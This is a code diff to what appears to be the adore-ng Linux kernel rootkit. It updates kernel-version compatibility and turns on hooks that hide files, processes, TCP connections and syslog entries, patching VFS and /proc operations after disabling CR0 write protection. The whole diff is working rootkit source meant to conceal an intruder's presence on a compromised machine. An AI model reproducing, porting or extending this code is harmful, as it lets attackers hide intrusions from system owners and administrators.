@@ -335,9 +335,8 @@ int adore_opt_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino
 			return 0;
 		}
 	}
-	if(!(inode = dentry->d_inode)) {
-	return 0;
-	}
+	if(!(inode = dentry->d_inode))
+		return 0;
 
 	uid = inode->i_uid PATCH_UID ;
 	gid = inode->i_gid PATCH_UID;
@@ -444,7 +443,6 @@ int adore_root_filldir(void *buf, const char *name, int nlen, loff_t off, u64 in
 	
 	uid = inode->i_uid PATCH_UID;
 	gid = inode->i_gid PATCH_UID;
-	//printk("%s: (%d %d)\n", name, uid, gid);
 	
 	//iput(inode);
 	//dput(dentry);
@@ -557,9 +555,7 @@ int patch_vfs(const char *p,
 	new_op->readdir = new_readdir;
 #else
 	new_op->iterate = new_iterate;
-	printk("patch starting, %x --> %x\n",
-		(unsigned)*orig_iterate,
-		(unsigned)new_iterate);
+	printk("patch starting, %p --> %p\n", *orig_iterate, new_iterate);
 #endif
 
 	filep->f_op = new_op;
@@ -587,9 +583,7 @@ int unpatch_vfs(const char *p,
 #if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))	
 	new_op->readdir = orig_readdir;
 #else
-	printk("unatch starting, %x --> %x\n",
-		(unsigned)new_op->iterate,
-		(unsigned)orig_iterate);
+	printk("unpatch starting, %p --> %p\n", new_op->iterate, orig_iterate);
 	new_op->iterate = orig_iterate;
 #endif
 		
@@ -672,13 +666,12 @@ struct tcp_seq_afinfo *proc_find_tcp_seq(void)
 struct tcp_seq_afinfo *proc_find_tcp_seq(void)
 {
 	struct file *filep;
+	struct tcp_seq_afinfo *afinfo;
 
 	filep = filp_open("/proc/net/tcp", O_RDONLY, 0);
-	printk("filp_open %x\n", filep);
 	if(!filep) return NULL;
 	
-	struct tcp_seq_afinfo *afinfo = PDE_DATA(filep->f_dentry->d_inode);
-	printk("inode %x afinfo %x\n", filep->f_dentry->d_inode, afinfo);
+	afinfo = PDE_DATA(filep->f_dentry->d_inode);
 	filp_close(filep, 0);
 	
 	return afinfo;
@@ -710,6 +703,7 @@ int adore_tcp4_seq_show(struct seq_file *seq, void *v)
 #ifndef UNIXCREDS
 #define UNIXCREDS(skb)	(&UNIXCB((skb)).cred)
 #endif
+#endif
 
 static
 int (*orig_unix_dgram_recvmsg)(struct kiocb *, struct socket *, struct msghdr *,
@@ -725,6 +719,7 @@ int adore_unix_dgram_recvmsg(struct kiocb *kio, struct socket *sock,
 	int err;
 	struct ucred *creds = NULL;
 	int not_done = 1;
+	__u32	pid;
 
 	if (strncmp(current->comm, "syslog", 6) != 0 || !msg || !sock)
 		goto out;
@@ -737,13 +732,16 @@ int adore_unix_dgram_recvmsg(struct kiocb *kio, struct socket *sock,
 
 	do {
 		msg->msg_namelen = 0;
-	        skb = skb_recv_datagram(sk, flags|MSG_PEEK, noblock, &err);
-        	if (!skb)
-                	goto out;
+		skb = skb_recv_datagram(sk, flags|MSG_PEEK, noblock, &err);
+		if (!skb) goto out;
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 9, 0))	
 		creds = UNIXCREDS(skb);
-		if (!creds)
-			goto out;
-		if ((not_done = should_be_hidden(creds->pid)))
+		if (!creds) goto out;
+		pid = creds->pid;
+#else
+		pid = pid_vnr(UNIXCB(skb).pid);
+#endif			
+		if ((not_done = should_be_hidden(pid)))
 			skb_dequeue(&sk->sk_receive_queue);
 	} while (not_done);
 
@@ -790,7 +788,6 @@ static int patch_syslog(void)
 
 	return 0;
 }
-#endif
 
 struct tcp_seq_afinfo *t_afinfo = NULL;
 
@@ -806,9 +803,8 @@ int __init adore_init(void)
 	memset(hidden_procs, 0, sizeof(hidden_procs));
 
     filep = filp_open(proc_fs, O_RDONLY|O_DIRECTORY, 0);
-	if (IS_ERR(filep)) {
+	if (IS_ERR(filep)) 
 		return -1;
-	}
 	
 	orig_cr0 = clear_return_cr0();
 
@@ -832,9 +828,9 @@ int __init adore_init(void)
 	if (t_afinfo) {
 		orig_tcp4_seq_show = t_afinfo->seq_ops.show;
 		t_afinfo->seq_ops.show = adore_tcp4_seq_show;
-		printk("patch proc_net: %x --> %x\n", orig_tcp4_seq_show, adore_tcp4_seq_show);
+		printk("patch proc_net: %p --> %p\n", orig_tcp4_seq_show, adore_tcp4_seq_show);
 	}
-	//patch_syslog();
+	patch_syslog();
 
 	j = 0;
 	for (i = 0; var_filenames[i]; ++i) {
@@ -844,8 +840,9 @@ int __init adore_init(void)
 			continue;
 		}
 		if (!j) {	/* just replace one time, its all the same FS */
-			//orig_var_write = var_files[i]->f_op->write;
-			//((struct file_operations *)(var_files[i]->f_op))->write = adore_var_write;
+			new_op = (struct file_operations *)(var_files[i]->f_op);
+			orig_var_write = new_op->write;
+			new_op->write = adore_var_write;
 			j = 1;
 		}
 	}
@@ -880,17 +877,15 @@ void __exit adore_cleanup(void)
 	
 	if (t_afinfo && orig_tcp4_seq_show)
 	{
-		printk("unpatch proc_net: %x --> %x\n", t_afinfo->seq_ops.show, orig_tcp4_seq_show);
+		printk("unpatch proc_net: %p --> %p\n", t_afinfo->seq_ops.show, orig_tcp4_seq_show);
 		t_afinfo->seq_ops.show = orig_tcp4_seq_show;
 	}
 	
 	orig_cr0 = clear_return_cr0();
 
 	filep = filp_open(proc_fs, O_RDONLY|O_DIRECTORY, 0);
-	if (IS_ERR(filep)) {
-		printk("failed to open proc\n");
-        return ;
-	}
+	if (IS_ERR(filep)) 
+		return ;
 	
 	new_inode_op = (struct inode_operations *)filep->f_dentry->d_inode->i_op;
 	new_inode_op->lookup = orig_proc_lookup;
@@ -912,9 +907,7 @@ void __exit adore_cleanup(void)
 		if (var_files[i]) {
 			if (!j) {
 				new_op = (struct file_operations *)var_files[i]->f_op;
-				//new_op->write = orig_var_write;
-
-				//var_files[i]->f_op->write = orig_var_write;
+				new_op->write = orig_var_write;
 				j = 1;
 			}
 			filp_close(var_files[i], 0);
